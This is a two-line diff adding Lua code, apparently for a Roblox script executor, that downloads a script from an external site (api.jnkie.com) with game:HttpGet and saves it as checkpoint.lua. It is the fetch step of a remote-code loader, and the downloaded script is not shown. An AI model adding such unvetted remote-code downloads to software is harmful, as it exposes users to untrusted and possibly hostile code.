@@ -1,0 +1,2 @@
+local s = game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/7b213547de494b4df84fc8b0046183c1ba9aa8b73b88eaa1a316822184532b89/download")
+writefile("checkpoint.lua", s)
